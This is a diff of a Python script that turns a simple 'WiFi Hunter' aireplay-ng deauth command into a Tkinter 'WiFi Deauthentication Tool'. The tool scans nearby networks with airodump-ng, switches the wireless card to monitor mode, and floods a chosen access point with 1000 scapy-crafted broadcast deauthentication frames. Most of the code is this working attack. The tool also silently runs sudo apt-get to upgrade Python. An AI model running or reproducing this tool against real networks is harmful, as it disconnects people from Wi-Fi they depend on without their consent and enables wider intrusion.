@@ -1,42 +1,230 @@
-import os 
+import os
+import sys
+import tkinter as tk
+import webbrowser
+import hashlib
+from tkinter import messagebox, Listbox, Scrollbar, simpledialog
+from scapy.all import *
+import subprocess
+import threading
 import time
-from tqdm import tqdm 
-import colorama
-print(colorama.Fore.GREEN)
-os.system("clear")
 
-# WiFi Hunter banner
-banner = '''
- ██╗    ██╗██╗███████╗██╗    ██╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
- ██║    ██║██║██╔════╝██║    ██║    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
- ██║ █╗ ██║██║█████╗  ██║ █╗ ██║    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
- ██║███╗██║██║██╔══╝  ██║███╗██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
- ╚███╔███╔╝██║███████╗╚███╔███╔╝    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
-  ╚══╝╚══╝ ╚═╝╚══════╝ ╚══╝╚══╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
-                                                                                       
-                                @vigneshthehacker
-'''
+PIN_FILE = "app_pin.txt"
 
-print(banner)
-print("                                     -------------------------   ")
-print(" Type this commend in your termunal |  airodump-ng -i wlan0   |  ")
-print("                                     -------------------------   ")
-print("")
-print()
-print()
+# Function to hash the PIN
+def hash_pin(pin):
+    return hashlib.sha256(pin.encode()).hexdigest()
 
+# Function to set a new PIN
+def set_pin():
+    pin = simpledialog.askstring("Set PIN", "Enter a 4-digit PIN:", show='*')
+    if pin and pin.isdigit() and len(pin) == 4:
+        hashed_pin = hash_pin(pin)
+        with open(PIN_FILE, "w") as f:
+            f.write(hashed_pin)
+        messagebox.showinfo("Success", "PIN set successfully!")
+        return True
+    else:
+        messagebox.showerror("Error", "Invalid PIN. Please enter a 4-digit number.")
+        return False
 
-'''print(colorama.Fore.RED+'')
-for _ in tqdm(range(101),
-    desc = "",
-    ascii = False,ncols=100):
-    time.sleep(0.1)
-print(colorama.Fore.GREEN+'') '''
+# Function to validate the PIN
+def validate_pin(pin):
+    if not os.path.exists(PIN_FILE):
+        return False
+    with open(PIN_FILE, "r") as f:
+        saved_hashed_pin = f.read().strip()
+    return hash_pin(pin) == saved_hashed_pin
 
-bssid=input(" Enter your bssid:")
+# Function to show the main content
+def show_main_content():
+    pin_frame.pack_forget()  # Hide the PIN entry frame
+    main_frame.pack(fill=tk.BOTH, expand=True)  # Show the main frame
 
-os.system(f"aireplay-ng --deauth 9999 -a {bssid} wlan0")
+# Function to handle PIN entry
+def handle_pin_entry():
+    entered_pin = pin_entry.get()
+    if validate_pin(entered_pin):
+        show_main_content()
+    else:
+        messagebox.showerror("Error", "Incorrect PIN.")
+        pin_entry.delete(0, tk.END)
 
+# Function to execute the WiFi deauthentication attack
+def execute_attack():
+    selected_network = network_listbox.get(tk.ACTIVE)
+    if not selected_network:
+        messagebox.showerror("Error", "Please select a network to attack.")
+        return
+    
+    hacknic = "wlan0"
+    target_bssid, target_channel = selected_network.split(',')[1:]
 
+    if not target_channel.isdigit():
+        messagebox.showerror("Error", "Invalid channel number.")
+        return
 
-  
+    try:
+        subprocess.run(["ip", "link", "set", hacknic, "down"], check=True)
+        subprocess.run(["iw", hacknic, "set", "monitor", "none"], check=True)
+        subprocess.run(["ip", "link", "set", hacknic, "up"], check=True)
+        subprocess.run(["iwconfig", hacknic, "channel", target_channel], check=True)
+    except subprocess.CalledProcessError as e:
+        messagebox.showerror("Error", f"Error setting up monitor mode: {e}")
+        return
+
+    try:
+        packet_count = 1000
+        send_deauth_packet(target_bssid, hacknic, count=packet_count)
+        messagebox.showinfo("Success", f"Sent {packet_count} deauthentication packets.")
+    except Exception as e:
+        messagebox.showerror("Error", f"Error sending deauthentication packets: {e}")
+
+    try:
+        subprocess.run(["service", "NetworkManager", "restart"], check=True)
+        messagebox.showinfo("Info", "Network settings restored. You should be able to access the internet again.")
+    except subprocess.CalledProcessError as e:
+        messagebox.showerror("Error", f"Error restoring network settings: {e}")
+
+# Function to send deauthentication packet
+def send_deauth_packet(target_bssid, interface, count=1000):
+    dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)
+    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+    sendp(packet, iface=interface, count=count, inter=0.1)
+
+# Function to scan for nearby networks
+def scan_networks():
+    scan_thread = threading.Thread(target=perform_scan)
+    scan_thread.start()
+
+def perform_scan():
+    try:
+        # Start scanning with airodump-ng
+        print("Starting network scan...")
+        csv_file = "/tmp/airodump-01.csv"
+        
+        # Remove any previous scan files
+        if os.path.exists(csv_file):
+            os.remove(csv_file)
+        
+        scan_process = subprocess.Popen(["sudo", "airodump-ng", "wlan0", "-w", "/tmp/airodump", "--output-format", "csv"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        time.sleep(10)  # Adjust sleep time if needed to allow airodump-ng to gather enough data
+        scan_process.terminate()
+        time.sleep(2)  # Allow some time for the process to clean up and write the file
+        
+        print("Scan completed. Checking for CSV file...")
+
+        # Verify that the CSV file exists
+        if not os.path.isfile(csv_file):
+            raise FileNotFoundError(f"No such file or directory: '{csv_file}'")
+
+        # Read the CSV file generated by airodump-ng
+        with open(csv_file, "r") as f:
+            scan_output = f.readlines()
+
+        print("Parsing scan results...")
+        networks = parse_scan_result(scan_output)
+        print(f"Found networks: {networks}")
+        update_network_listbox(networks)
+    except Exception as e:
+        messagebox.showerror("Error", f"Error scanning networks: {e}")
+
+# Function to parse scan result
+def parse_scan_result(scan_result):
+    networks = []
+    for line in scan_result:
+        if "BSSID" in line or "Station MAC" in line or len(line.strip()) == 0:
+            continue
+        fields = line.split(',')
+        if len(fields) > 13:
+            bssid = fields[0].strip()
+            channel = fields[3].strip()
+            ssid = fields[13].strip()
+            networks.append(f"{ssid},{bssid},{channel}")
+    print(f"Parsed networks: {networks}")  # Debug statement
+    return networks
+
+# Function to update the network listbox
+def update_network_listbox(networks):
+    network_listbox.delete(0, tk.END)
+    for network in networks:
+        ssid = network.split(',')[0]
+        print(f"Updating listbox with network: {network}")  # Debug statement
+        network_listbox.insert(tk.END, network)
+
+# Function to open the login page in the browser
+def open_login_page():
+    webbrowser.open('http://localhost/auth/login.html')
+
+# Function to check Python version
+def check_python_version():
+    current_version = sys.version_info
+    print(f"Current Python version: {current_version.major}.{current_version.minor}.{current_version.micro}")
+    
+    required_version = (3, 8)
+    
+    if current_version < required_version:
+        print(f"Python version is outdated. Updating to Python {required_version[0]}.{required_version[1]}...")
+        update_python()
+    else:
+        print("Python version is up to date.")
+
+# Function to update Python
+def update_python():
+    try:
+        os.system("sudo apt-get update")
+        os.system("sudo apt-get install -y python3")
+        print("Python has been updated. Please restart the terminal to reflect changes.")
+    except Exception as e:
+        print(f"An error occurred while updating Python: {e}")
+
+if __name__ == "__main__":
+    check_python_version()
+    
+    # Create the main window
+    root = tk.Tk()
+    root.title("WiFi Deauthentication Tool")
+    root.configure(bg="#2E2E2E")  # Dark background color
+    root.geometry("600x400")
+
+    # PIN entry frame
+    pin_frame = tk.Frame(root, bg="#2E2E2E")
+    pin_frame.pack(fill=tk.BOTH, expand=True)
+
+    tk.Label(pin_frame, text="Enter PIN:", bg="#2E2E2E", fg="white").pack(pady=10)
+
+    pin_entry = tk.Entry(pin_frame, show="*", justify='center')
+    pin_entry.pack(pady=10)
+
+    tk.Button(pin_frame, text="Submit", command=handle_pin_entry, bg="#1A1A1A", fg="white").pack(pady=10)
+
+    # Main content frame
+    main_frame = tk.Frame(root, bg="#2E2E2E")
+
+    # Network listbox
+    network_frame = tk.Frame(main_frame, bg="#2E2E2E")  # Dark background color
+    network_frame.pack(pady=10, fill=tk.BOTH, expand=True)
+    scrollbar = Scrollbar(network_frame, orient=tk.VERTICAL)
+    network_listbox = Listbox(network_frame, selectmode=tk.SINGLE, yscrollcommand=scrollbar.set, bg="#1A1A1A", fg="white", width=80)  # Darker listbox color
+    scrollbar.config(command=network_listbox.yview)
+    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+    network_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+
+    # Buttons frame
+    buttons_frame = tk.Frame(main_frame, bg="#2E2E2E")
+    buttons_frame.pack(pady=20)
+
+    # Scan button
+    scan_button = tk.Button(buttons_frame, text="Scan Networks", command=scan_networks, bg="#1A1A1A", fg="white")  # Darker button color
+    scan_button.pack(side=tk.LEFT, padx=5)
+
+    # Attack button
+    attack_button = tk.Button(buttons_frame, text="Execute Attack", command=execute_attack, bg="#1A1A1A", fg="white")  # Darker button color
+    attack_button.pack(side=tk.LEFT, padx=5)
+
+    # Login button
+    login_button = tk.Button(root, text="Login", command=open_login_page, bg="#0044cc", fg="white")
+    login_button.pack(pady=10)
+
+    # Run the application
+    root.mainloop()
